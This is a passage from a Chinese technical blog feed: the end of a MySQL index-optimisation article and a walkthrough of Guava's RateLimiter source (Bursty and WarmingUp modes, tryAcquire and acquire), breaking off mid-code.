一般出现于排序， 分组和多表 join 的情况， 查询效率不高，建议优化。</li><li>using where ：表名使用了where过滤。</li></ul><h2 id="五、优化案例"><a href="#五、优化案例" class="headerlink" title="五、优化案例"></a>五、优化案例</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlexplain <span class="keyword">select</span> u.*,o.* <span class="keyword">from</span> user_info u <span class="keyword">LEFT</span> <span class="keyword">JOIN</span>  order_info o <span class="keyword">on</span> u.id=o.user_id;</span><br></pre></td></tr></table></figure><p>执行结果，type有ALL，并且没有索引：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/200555_ZcS7_3577599.png" alt="img"></p><p>开始优化，在关联列上创建索引，明显看到type列的ALL变成ref，并且用到了索引，rows也从扫描9行变成了1行：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/200819_KxR2_3577599.png" alt="img"></p><p>这里面一般有个规律是：左链接索引加在右表上面，右链接索引加在左表上面。</p><h2 id="六、是否需要创建索引？"><a href="#六、是否需要创建索引？" class="headerlink" title="六、是否需要创建索引？"></a>六、是否需要创建索引？</h2><p>索引虽然能非常高效的提高查询速度，同时却会降低更新表的速度。实际上索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录，所以索引列也是要占用空间的。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/131616_BaL3_3577599.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>限流原理解读之guava中的RateLimiter</title>
      <link href="/The%20RateLimiter%20in%20the%20guava/"/>
      <url>/The%20RateLimiter%20in%20the%20guava/</url>
      
        <content type="html"><![CDATA[<p><font color= #EE82EE>限流原理解读之guava中的RateLimiter</font></p><a id="more"></a><h1 id="限流原理解读之guava中的RateLimiter"><a href="#限流原理解读之guava中的RateLimiter" class="headerlink" title="限流原理解读之guava中的RateLimiter"></a><font color= #EE82EE>限流原理解读之guava中的RateLimiter</font></h1><p>RateLimiter有两种新建的方式</p><ol><li>创建Bursty方式</li><li>创建WarmingUp方式</li></ol><blockquote><p>以下源码来自 guava-17.0</p></blockquote><h1 id="Bursty"><a href="#Bursty" class="headerlink" title="Bursty"></a><font color= #EE82EE>Bursty</font></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line">RateLimiter r = RateLimiter.create(<span class="number">1</span>); </span><br><span class="line"><span class="comment">//不阻塞</span></span><br><span class="line">r.tryAcquire();</span><br><span class="line"><span class="comment">//阻塞</span></span><br><span class="line">r.acquire()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RateLimiter.create做了两件事情创建Bursty对象和设置了速率,至次初始化过程结束</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RateLimiter rateLimiter = <span class="keyword">new</span> Bursty(ticker, <span class="number">1.0</span> <span class="comment">/* maxBurstSeconds */</span>); <span class="comment">//ticker默认使用自己定义的</span></span><br><span class="line">rateLimiter.setRate(permitsPerSecond);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>新建Bursty对象。它指定的是能够存储的最大时间是多长，比如设置的时间是<font color= #EE82EE>1s</font>,那么假设允许每秒钟发放的令牌数量为<font color= #EE82EE>2</font>，能存储的最大量为<font color= #EE82EE>2</font>；</p></li><li><p>setRate。 内部通过私有锁来保证速率的修改是线程安全的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (mutex) &#123;</span><br><span class="line">  <span class="comment">//1：查看当前的时间是否比预计下次可发放令牌的时间要大，如果大，更新下次可发放令牌的时间为当前时间</span></span><br><span class="line">  resync(readSafeMicros());</span><br><span class="line">  <span class="comment">//2：计算两次发放令牌之间的时间间隔，比如1s中需要发放5个，那它就是 200000.0微秒</span></span><br><span class="line">  <span class="keyword">double</span> stableIntervalMicros = TimeUnit.SECONDS.toMicros(<span class="number">1L</span>) / permitsPerSecond;</span><br><span class="line">  <span class="keyword">this</span>.stableIntervalMicros = stableIntervalMicros;</span><br><span class="line">  <span class="comment">//3：设置maxPermits和storedPermits</span></span><br><span class="line">  doSetRate(permitsPerSecond, stableIntervalMicros);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><blockquote><p>resync源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resync</span><span class="params">(<span class="keyword">long</span> nowMicros)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 查看当前的时间是否比预计下次可发放令牌的时间要大，如果大，更新下次可发放令牌的时间为当前时间</span></span><br><span class="line">  <span class="keyword">if</span> (nowMicros &gt; nextFreeTicketMicros) &#123;</span><br><span class="line">    storedPermits = Math.min(maxPermits,</span><br><span class="line">        storedPermits + (nowMicros - nextFreeTicketMicros) / stableIntervalMicros);</span><br><span class="line">    nextFreeTicketMicros = nowMicros;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>doSetRate源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Overridevoid</span> doSetRate(<span class="keyword">double</span> permitsPerSecond, <span class="keyword">double</span> stableIntervalMicros) &#123;</span><br><span class="line"> <span class="keyword">double</span> oldMaxPermits = <span class="keyword">this</span>.maxPermits;</span><br><span class="line"> maxPermits = maxBurstSeconds * permitsPerSecond;</span><br><span class="line"> storedPermits = (oldMaxPermits == <span class="number">0.0</span>)</span><br><span class="line">     ? <span class="number">0.0</span> <span class="comment">// 初始条件存储的是没有</span></span><br><span class="line">    storedPermits * maxPermits / oldMaxPermits;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>在整个的初始化过程中，关键信息是：</p><ul><li><font color=  #00FF7F >nextFreeTicketMicros</font> 预计下次发放令牌的时间, stableIntervalMicros 两次发放令牌之间的时间间隔</li><li><font color=  #00FF7F>maxPermits</font> 最大能存储的令牌的数量 storedPermits 已经存储的令牌数</li></ul><h2 id="为什么是nextFreeTicketMicros"><a href="#为什么是nextFreeTicketMicros" class="headerlink" title="为什么是nextFreeTicketMicros?"></a><font color= #EE82EE>为什么是nextFreeTicketMicros?</font></h2><p>最简单的维持QPS速率的方式就是记住最后一次请求的时间，然后确保再次有请求过来的时候，已经经过了 1/QPS 秒。比如QPS是5 次/秒，只需要确保两次请求时间经过了200ms即可，如果刚好在100ms到达，就会再等待100ms,也就是说，如果一次性需要15个令牌，需要的时间为为3s。但是对于一个长时间没有请求的系统，这样的的设计方式有一定的不合理之处。考虑一个场景：如果一个RateLimiter,每秒产生1个令牌,它一直没有使用过，突然来了一个需要100个令牌的请求，选择等待100s再执行这个请求，显得不太明智，更好的处理方式为立即执行它，然后把接下来的请求推迟100s。</p><p>因而RateLimiter本身并不记下最后一次请求的时间，而是记下下一次期望运行的时间（nextFreeTicketMicros）。</p><blockquote><p>这种方式带来的一个好处是，可以去判断等待的超时时间是否大于下次运行的时间，以使得能够执行，如果等待的超时时间太短，就能立即返回。</p></blockquote><h2 id="为什么会有一个标记代表存储了多少令牌？"><a href="#为什么会有一个标记代表存储了多少令牌？" class="headerlink" title="为什么会有一个标记代表存储了多少令牌？"></a><font color= #EE82EE>为什么会有一个标记代表存储了多少令牌？</font></h2><p>同样的考虑长时间没有使用的场景。如果长时间没有请求，突然间来了，这个时候是否应该立马放行这些请求？长时间没有使用可能意味着两件事：</p><ol><li>很多资源是存在空闲的情况，比如说网络请求长时间没有，它的缓冲区很有可能是空的，此时是可以加速传输，提高它的利用率</li><li>一些时候，瞬间的爆发会导致溢出，比如说服务上的缓存过期了，需要去查询库，这个花销是非常“昂贵”的，过多的请求会导致数据库撑不住</li></ol><p>RateLimiter就使用storedPermits来给过去请求的不充分程度建模。它的存储规则如下： 假设RateLimiter每秒产生一个令牌,每过去一秒如果没有请求，RateLimter也就没有消费，就使storedPermits增长1。假设10s之内都没有请求过来,storedPermits就变成了10（假设maxPermits&gt;10），此时如果要获取3个令牌，会使用storedPermits来中的令牌来处理，然后它的值变为了7，片刻之后，如果调用了acquire(10),部分的会从storedPermits拿到7个权限，剩余的3个则需要重新产生。</p><p>总的来说RateLimiter提供了一个<font color=  #00FF7F>storedPermits</font>变量，当资源利用充分的时候，它就是0，最大可以增长到 <font color=  #00FF7F>maxStoredPermits</font>。请求所需的令牌来自于两个地方：stored permits(空闲时存储的令牌)和fresh permits（现有的令牌）</p><h2 id="怎么衡量从storedPermits中获取令牌这个过程？"><a href="#怎么衡量从storedPermits中获取令牌这个过程？" class="headerlink" title="怎么衡量从storedPermits中获取令牌这个过程？"></a><font color= #EE82EE>怎么衡量从storedPermits中获取令牌这个过程？</font></h2><p>同样假设每秒RateLimiter只生产一个令牌，正常情况下，如果一次来了3个请求，整个过程会持续3秒钟。考虑到长时间没有请求的场景：</p><ol><li>资源空闲。这种时候系统是能承受住一定量的请求的，当然希望在承受范围之内能够更快的提供请求，也就是说，如果有存储令牌，相比新产生令牌，此时希望能够更快的获取令牌，也就是此时从存储令牌中获取令牌的时间消耗要比产生新令牌要少，从而更快相应请求</li><li>瞬时流量过大。这时候就不希望过快的消耗存储的令牌，希望它能够相比产生新的令牌的时间消耗大些，从而能够使请求相对平缓。</li></ol><p>分析可知，针对不同的场景，需要对获取storedPermits做不同的处理，Ratelimiter的实现方式就是 storedPermitsToWaitTime 函数，它建立了从storedPermits中获取令牌和时间花销的模型函数,而衡量时间的花销就是通过对模型函数进行积分计算，比如原来存储了10个令牌，现在需要拿3个令牌，还剩余7个，那么所需要的时间花销就是该函数从7-10区间中的积分。</p><blockquote><p>这种方式保证了任何获取令牌方式所需要的时间都是一样的，好比 每次拿一个和先拿两个再拿一个，从时间上来讲并没有分别。</p></blockquote><h2 id="storedPermitsToWaitTime实现原理"><a href="#storedPermitsToWaitTime实现原理" class="headerlink" title="storedPermitsToWaitTime实现原理"></a><font color= #EE82EE>storedPermitsToWaitTime实现原理</font></h2><p>storedPermits本身是用来衡量没有使用的时间的。在没有使用令牌的时候存储，存储的速率（单位时间内存储的令牌的个数）是 每没用1次就存储1次: rate=permites/time 。也就是说 1 / rate = time / permits，那么可得到 (1/rate)*permits 就可以来衡量时间花销。</p><p>选取(1/rate)作为基准线</p><ul><li>如果选取一条在它之上的线，就做到了比从fresh permits中获取要慢；</li><li>如果在基准线之下，则是比从fresh permits中获取要快；</li><li>刚好是基准线，那么从storedPermits中获取和新产生的速率一模一样；</li></ul><h2 id="Bursty的storedPermitsToWaitTime函数实现"><a href="#Bursty的storedPermitsToWaitTime函数实现" class="headerlink" title="Bursty的storedPermitsToWaitTime函数实现"></a><font color= #EE82EE>Bursty的storedPermitsToWaitTime函数实现</font></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">storedPermitsToWaitTime</span><span class="params">(<span class="keyword">double</span> storedPermits, <span class="keyword">double</span> permitsToTake)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>它直接返回了0，也就是在基准线之下，获取storedPermits的速率比新产生要快，立即能够拿到存储的量</p><h1 id="WarmingUp"><a href="#WarmingUp" class="headerlink" title="WarmingUp"></a><font color= #EE82EE>WarmingUp</font></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line">RateLimiter r =RateLimiter.create(<span class="number">1</span>,<span class="number">1</span>,TimeUnit.SECONDS);</span><br><span class="line"><span class="comment">//不阻塞</span></span><br><span class="line">r.tryAcquire();</span><br><span class="line"><span class="comment">//阻塞</span></span><br><span class="line">r.acquire()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>create方法创建了WarmingUp对象，并这只了对应的速率</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RateLimiter rateLimiter = <span class="keyword">new</span> WarmingUp(ticker, warmupPeriod, unit);</span><br><span class="line">rateLimiter.setRate(permitsPerSecond);</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>相比Bursty，它多了个参数warmupPeroid,它会以提供的unit为时间单位，转换成微秒存储。setRate类似于Bursty，只是在doSetRate提供不同的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doSetRate</span><span class="params">(<span class="keyword">double</span> permitsPerSecond, <span class="keyword">double</span> stableIntervalMicros)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">double</span> oldMaxPermits = maxPermits;</span><br><span class="line">  <span class="comment">//1:最大的存储个数为需要预热的时间除以两个请求的时间间隔，比如设定预热时间为1s,每秒有5个请求，那么最大的存储个数为1000ms/200ms=5个</span></span><br><span class="line">  maxPermits = warmupPeriodMicros / stableIntervalMicros; </span><br><span class="line">  <span class="comment">//2:计算最大存储permits的一半</span></span><br><span class="line">  halfPermits = maxPermits / <span class="number">2.0</span>;</span><br><span class="line">  <span class="comment">//3:初始化稳定时间间隔的3倍作为冷却时间间隔</span></span><br><span class="line">  <span class="keyword">double</span> coldIntervalMicros = stableIntervalMicros * <span class="number">3.0</span>;</span><br><span class="line">  <span class="comment">//4:设置基准线的斜率</span></span><br><span class="line">  slope = (coldIntervalMicros - stableIntervalMicros) / halfPermits;</span><br><span class="line">  <span class="keyword">if</span> (oldMaxPermits == Double.POSITIVE_INFINITY) &#123;</span><br><span class="line">    storedPermits = <span class="number">0.0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    storedPermits = (oldMaxPermits == <span class="number">0.0</span>)</span><br><span class="line">        ? maxPermits <span class="comment">// 初始条件下，认为就是存储满的，以达到缓慢消费的效果</span></span><br><span class="line">        : storedPermits * maxPermits / oldMaxPermits;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个过程中可以看到Warmup方式新增了一个halfPermits的设计，以及通过公式 <code>slope=(coldIntervalMicros-stableIntervalMicros)/halfPermits</code>，他们在函数 storedPermitsToWaitTime中得到了运用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Overridelong</span> storedPermitsToWaitTime(<span class="keyword">double</span> storedPermits, <span class="keyword">double</span> permitsToTake) &#123;</span><br><span class="line">  <span class="comment">//1:计算储存的令牌中超过了最大令牌一半的数量</span></span><br><span class="line">  <span class="keyword">double</span> availablePermitsAboveHalf = storedPermits - halfPermits;</span><br><span class="line">  <span class="keyword">long</span> micros = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 计算超过一半的部分所需要的时间花销(对于函数来说，就是积分计算)</span></span><br><span class="line">  <span class="keyword">if</span> (availablePermitsAboveHalf &gt; <span class="number">0.0</span>) &#123;</span><br><span class="line">    <span class="keyword">double</span> permitsAboveHalfToTake = Math.min(availablePermitsAboveHalf, permitsToTake);</span><br><span class="line">    micros = (<span class="keyword">long</span>) (permitsAboveHalfToTake * (permitsToTime(availablePermitsAboveHalf)</span><br><span class="line">        + permitsToTime(availablePermitsAboveHalf - permitsAboveHalfToTake)) / <span class="number">2.0</span>);</span><br><span class="line">    permitsToTake -= permitsAboveHalfToTake;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 计算函数的尚未超过一半的部分所需要的时间花销</span></span><br><span class="line">  micros += (stableIntervalMicros * permitsToTake);</span><br><span class="line">  <span class="keyword">return</span> micros;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">double</span> <span class="title">permitsToTime</span><span class="params">(<span class="keyword">double</span> permits)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> stableIntervalMicros + permits * slope;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WarmingUp的设计理念"><a href="#WarmingUp的设计理念" class="headerlink" title="WarmingUp的设计理念"></a><font color= DarkSlateGray1 >WarmingUp的设计理念</font></h2><p>WarmingUp对时间花销衡量方式为下图</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*          ^ throttling</span><br><span class="line">*          |</span><br><span class="line">* <span class="number">3</span>*stable +                  /</span><br><span class="line">* interval |                 /.</span><br><span class="line">*  (cold)  |                / .</span><br><span class="line">*          |               /  .   &lt;-- <span class="string">&quot;warmup period&quot;</span> is the area of the trapezoid between</span><br><span class="line">* <span class="number">2</span>*stable +              /   .       halfPermits and maxPermits</span><br><span class="line">* interval |             /    .</span><br><span class="line">*          |            /     .</span><br><span class="line">*          |           /      .</span><br><span class="line">*   stable +----------/  WARM . &#125;</span><br><span class="line">* interval |          .   UP  . &#125; &lt;-- <span class="function"><span class="keyword">this</span> <span class="title">rectangle</span> <span class="params">(from <span class="number">0</span> to maxPermits, and</span></span></span><br><span class="line"><span class="function"><span class="params">*          |          . PERIOD. &#125;     height == stableInterval)</span> defines the cooldown period,</span></span><br><span class="line"><span class="function">*          |          .       . &#125;     and we want cooldownPeriod </span>== warmupPeriod</span><br><span class="line">*          |---------------------------------&gt; storedPermits</span><br><span class="line">*              (halfPermits) (maxPermits)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>横轴表示存储的令牌个数，纵轴表示时间，这样函数的积分就可以表示所要消耗的时间。<br>在程序刚开始运行的时候，warmingup方式会存满所有的令牌，而根据从存储令牌中的获取方式，可以实现从存储最大令牌中到降到一半令牌所需要的时间为存储同量令牌时间的2倍，从而使得刚开始的时候发放令牌的速度比较慢，等消耗一半之后，获取的速率和生产的速率一致，从而也就实现了一个‘热身’的概念</p></blockquote><p>从storedPermits中获取令牌所需要的时间，它分为两部分，以maxPetmits的一半为分割点</p><ul><li>storedPermits &lt;= halfPermits 的时候,存储和消费storedPermits的速率与产生的速率一模一样</li><li>storedPermits&gt;halfPermits, 存储storePermites所需要的时间和产生的速率保持一致，但是消费storePermites从maxPermits到halfPermits所需要的时间为从halfPermits增长到maxPermits所需要时间的2被，也就是比新令牌产生要慢 为什么在分隔点计算还有斜率方面选了3倍和一半的位置 对函数做积分计算(图形面积)，刚好可以保证，超过一半的部分，如果要拿掉一半的存储令牌所需要的时间恰好是存储同样量（或者说是新令牌产生）时间花销的两倍，对应场景如果过了很长一段时间没有使用(存储的令牌会达到maxPermits),刚开始能接收请求的速率相对比较慢，然后再增长到稳定的消费速率</li></ul><blockquote><p>关键在于存储的速率是和新令牌产生的速率一样，但是消费的速率，当存储的超过一半时，会慢于新令牌产生的速率，小于一半则速率是一样的</p></blockquote><h1 id="TryAcquire"><a href="#TryAcquire" class="headerlink" title="TryAcquire"></a><font color= #EE82EE>TryAcquire</font></h1><p>它会尝试去获取令牌，如果无法获取就立即返回，否则再超时时间之内返回给定的令牌。 源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> permits, <span class="keyword">long</span> timeout, TimeUnit unit)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//1：使用微秒来转换超时时间</span></span><br><span class="line">  <span class="keyword">long</span> timeoutMicros = unit.toMicros(timeout);</span><br><span class="line">  checkPermits(permits);</span><br><span class="line">  <span class="keyword">long</span> microsToWait;</span><br><span class="line">  <span class="keyword">synchronized</span> (mutex) &#123;</span><br><span class="line">    <span class="keyword">long</span> nowMicros = readSafeMicros();</span><br><span class="line">    <span class="comment">//2.1：如果下次能够获取令牌的时间超过超时时间范围，立马返回；</span></span><br><span class="line">    <span class="keyword">if</span> (nextFreeTicketMicros &gt; nowMicros + timeoutMicros) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//2.2：获取需要等待的时间，本次获取的时间肯定不会超时</span></span><br><span class="line">      microsToWait = reserveNextTicket(permits, nowMicros);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//3：实行等待</span></span><br><span class="line">  ticker.sleepMicrosUninterruptibly(microsToWait);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一次运行的时候，nextFreeTicketMicros是创建时候的时间，必定小于当前时间，所以第一次肯定会放过，允许执行，只是需要计算要等待的时间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">long</span> <span class="title">reserveNextTicket</span><span class="params">(<span class="keyword">double</span> requiredPermits, <span class="keyword">long</span> nowMicros)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//1：如果下次可以获取令牌的时间在过去，更新</span></span><br><span class="line">  resync(nowMicros);</span><br><span class="line">  <span class="comment">//2：计算距离下次获取令牌需要的时间，如果nextFreeTikcetMicros&gt;nowMicros，这个时间段必定在超时时间之内,假如入超时时间是0，那么必定是microsToNextFreeTicket趋近于0，也就是立马能够放行；</span></span><br><span class="line">  <span class="keyword">long</span> microsToNextFreeTicket = Math.max(<span class="number">0</span>, nextFreeTicketMicros - nowMicros);</span><br><span class="line">  <span class="comment">//3：计算需要消耗的存储的令牌</span></span><br><span class="line">  <span class="keyword">double</span> storedPermitsToSpend = Math.min(requiredPermits, <span class="keyword">this</span>.storedPermits);</span><br><span class="line">  <span class="comment">//4：计算需要新产生的令牌</span></span><br><span class="line">  <span class="keyword">double</span> freshPermits = requiredPermits - storedPermitsToSpend;</span><br><span class="line">  <span class="comment">//5：计算消耗存储令牌所需要的时间和新产生令牌所需要的时间。对于Bursty来讲，消耗存储的令牌所需要时间为0，WarmingUp方式则是需要根据不同的场景有不同的结果</span></span><br><span class="line">  <span class="keyword">long</span> waitMicros = storedPermitsToWaitTime(<span class="keyword">this</span>.storedPermits, storedPermitsToSpend)</span><br><span class="line">      + (<span class="keyword">long</span>) (freshPermits * stableIntervalMicros);</span><br><span class="line">  <span class="comment">//6：下次能够获取令牌的时间，需要延迟当前已经等待的时间，也就是说，如果立马有请求过来会放行，但是这个等待时间将会影响后续的请求访问，也就是说，这次的请求如果当前的特别的多，下一次能够请求的能够允许的时间必定会有很长的延迟</span></span><br><span class="line">  <span class="keyword">this</span>.nextFreeTicketMicros = nextFreeTicketMicros + waitMicros;</span><br><span class="line">  <span class="comment">//7：扣除消耗的存储令牌</span></span><br><span class="line">  <span class="keyword">this</span>.storedPermits -= storedPermitsToSpend;</span><br><span class="line">  <span class="comment">//8：返回本次要获取令牌所需要的时间,它肯定不会超过超时时间</span></span><br><span class="line">  <span class="keyword">return</span> microsToNextFreeTicket;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Acquire"><a href="#Acquire" class="headerlink" title="Acquire"></a><font color= #EE82EE>Acquire</font></h1><p>它会阻塞知道允许放行，返回值为阻塞的时长 源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">acquire</span><span class="params">(<span class="keyword">int</span> permits)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> microsToWait = reserve(permits); <span class="comment">//也就是调用reserveNextTicket</span></span><br><span class="line">  ticker.sleepMicrosUninterruptibly(microsToWait); <span class="comment">//阻塞住需要等待的时长</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1.0</span> * microsToWait / TimeUnit.SECONDS.toMicros(<span class="number">1L</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="TryAcquire-运行案例"><a href="#TryAcquire-运行案例" class="headerlink" title="TryAcquire 运行案例"></a><font color= #EE82EE>TryAcquire 运行案例</font></h1><p>程序设置10个线程,使得并发数为10，模拟线上的场景,任务内容如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTask</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CountDownLatch latch;</span><br><span class="line">    <span class="keyword">private</span> RateLimiter limiter;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyTask</span><span class="params">(CountDownLatch latch, RateLimiter limiter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.latch = latch;</span><br><span class="line">        <span class="keyword">this</span>.limiter = limiter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//使得线程同时触发            </span></span><br><span class="line">           latch.await();</span><br><span class="line">            System.out.println(<span class="string">&quot;time &quot;</span>+System.currentTimeMillis()+<span class="string">&quot;ms :&quot;</span>+limiter.tryAcquire());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 